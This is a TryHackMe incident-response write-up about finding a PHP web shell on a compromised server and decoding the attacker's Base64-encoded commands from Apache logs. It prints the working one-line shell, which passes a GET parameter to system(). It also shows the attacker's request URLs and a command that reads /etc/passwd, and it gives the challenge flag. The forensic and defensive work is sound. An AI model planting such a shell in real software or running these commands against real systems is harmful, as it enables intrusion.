# Infinity Shell - TryHackMe Writeup

## Overview

Today we have another **TryHackMe Defensive Security** challenge named **Infinity Shell**. This room focuses on **incident response**, **web shell detection**, **log analysis**, and **understanding attacker activity** after a web application has been compromised.

Our objective is to investigate the compromised web server, identify the malicious web shell, analyze the attacker's commands, and recover the hidden flag.

---

# Scenario

> Cipher’s legion of bots has exploited a known vulnerability in our web application, leaving behind a dangerous web shell implant. Investigate the breach and trace the attacker's footsteps!

From the scenario itself we immediately know a few important things:

- The web application has already been compromised.
- A **web shell** has been uploaded to the server.
- We need to perform forensic analysis instead of exploitation.
- The attacker's activities should still be visible within the web server.

Since the challenge mentions a **web application compromise**, the first place to investigate is the web root.

---

# Initial Enumeration

The default web directory is:

```bash
/var/www/html
```

Since malicious web shells are usually uploaded inside the application's directories, we begin enumerating the contents.

Inside the web root we find:

```
CMSsite-master/
```

This appears to be the website source directory.

We continue exploring its contents.

---

# Discovering the Web Shell

Inside the following directory:

```
/var/www/html/CMSsite-master/img/
```

we discover a suspicious PHP file named:

```
images.php
```

Opening the file reveals:

```php
<?php
system(base64_decode($_GET['query']));
?>
```

---

# Analyzing the PHP Script

This tiny PHP script is actually an extremely dangerous web shell.

Let's break it down.

```php
$_GET['query']
```

Reads the value supplied in the URL parameter:

```
?query=
```

For example:

```
images.php?query=...
```

---

Next,

```php
base64_decode()
```

decodes the Base64-encoded value supplied by the attacker.

---

Finally,

```php
system()
```

executes the decoded string as an operating system command.

In other words:

```
Attacker Request
        │
        ▼
Base64 Encoded Command
        │
        ▼
base64_decode()
        │
        ▼
system()
        │
        ▼
Linux Command Execution
```

This provides the attacker with full remote command execution (RCE) on the web server.

---

# Investigating Web Logs

Since this is a forensic investigation, the next logical step is reviewing the Apache access logs.

Inside the logs we observe several suspicious requests.

```
GET /CMSsite-master/img/images.php?query=ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=
```

Immediately we notice requests being sent directly to the malicious web shell.

The attacker is supplying Base64 encoded commands through the `query` parameter.

---

Additional requests include:

```
GET /CMSsite-master/img/images.php?query=aWZjb25maWcK
```

```
GET /CMSsite-master/img/images.php?query=Y2F0IC9ldGMvcGFzc3dkCg==
```

```
GET /CMSsite-master/img/images.php?query=aWQK
```

These clearly indicate the attacker is executing Linux commands remotely.

---

# Decoding the Commands

Since every command is Base64 encoded, we can decode them.

---

## Command 1

```
aWZjb25maWcK
```

Decodes to:

```bash
ifconfig
```

Purpose:

- View network interfaces
- Enumerate IP addresses
- Gather networking information

---

## Command 2

```
Y2F0IC9ldGMvcGFzc3dkCg==
```

Decodes to:

```bash
cat /etc/passwd
```

Purpose:

- Enumerate local users
- Gather account information
- Identify possible privilege escalation targets

---

## Command 3

```
aWQK
```

Decodes to:

```bash
id
```

Purpose:

- Determine which user the web server is running as
- Verify execution privileges

---

# Recovering the Flag

One request stands out immediately:

```
ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=
```

This does not resemble a standard enumeration command.

To decode it we can use:

```bash
echo "ZWNobyAnVEhNe3N1cDNyXzM0c3lfdzNic2gzbGx9Jwo=" | base64 -d
```

The decoded command becomes:

```bash
echo 'THM{sup3r_34sy_w3bsh3ll}'
```

The attacker simply echoed the flag.

---

# Flag

```
THM{sup3r_34sy_w3bsh3ll}
```

---

# Attack Flow

The attack followed a straightforward sequence:

```
Application Exploited
          │
          ▼
Web Shell Uploaded
          │
          ▼
images.php Executed
          │
          ▼
Base64 Commands Sent
          │
          ▼
Commands Decoded
          │
          ▼
system() Executes Commands
          │
          ▼
Attacker Enumerates System
          │
          ▼
Flag Retrieved
```

---

# Indicators of Compromise (IOCs)

## Suspicious File

```
/var/www/html/CMSsite-master/img/images.php
```

---

## Malicious PHP Function

```php
system()
```

---

## Suspicious Parameter

```
query=
```

---

## Suspicious Encoding

```
Base64
```

---

## Suspicious Commands Observed

```bash
ifconfig
```

```bash
cat /etc/passwd
```

```bash
id
```

```bash
echo 'THM{sup3r_34sy_w3bsh3ll}'
```

---

# Why Base64?

Attackers frequently encode commands using Base64 because:

- Avoids URL encoding issues.
- Makes requests less obvious during quick inspections.
- Helps evade simple detection rules that look for common Linux commands.
- Provides a lightweight form of obfuscation (not encryption).

Although Base64 is trivial to decode, it is commonly seen in real-world web shell activity.

---

# Vulnerabilities Identified

- Remote Command Execution (RCE).
- Malicious PHP web shell.
- Use of `system()` for arbitrary command execution.
- Lack of file integrity monitoring.
- Absence of web shell detection mechanisms.
- Insufficient validation of uploaded files.

---

# Mitigation

To prevent similar compromises:

- Disable dangerous PHP functions such as:
  - `system()`
  - `exec()`
  - `shell_exec()`
  - `passthru()`
  - `popen()`
- Restrict file upload locations and validate uploaded content.
- Monitor web directories for unexpected PHP files.
- Enable a Web Application Firewall (WAF).
- Regularly review Apache and web server logs for suspicious requests.
- Deploy File Integrity Monitoring (FIM) to detect unauthorized file changes.
- Keep CMS software and plugins updated to patch known vulnerabilities.

---

# Key Takeaways

This challenge demonstrates how a simple PHP web shell can provide complete remote command execution when left undetected. By reviewing the web application directory and analyzing Apache access logs, we can reconstruct the attacker's actions, identify every command executed on the compromised server, and recover the flag. It reinforces the importance of log analysis, web shell detection, secure file upload handling, and continuous monitoring as essential components of defensive security and incident response.
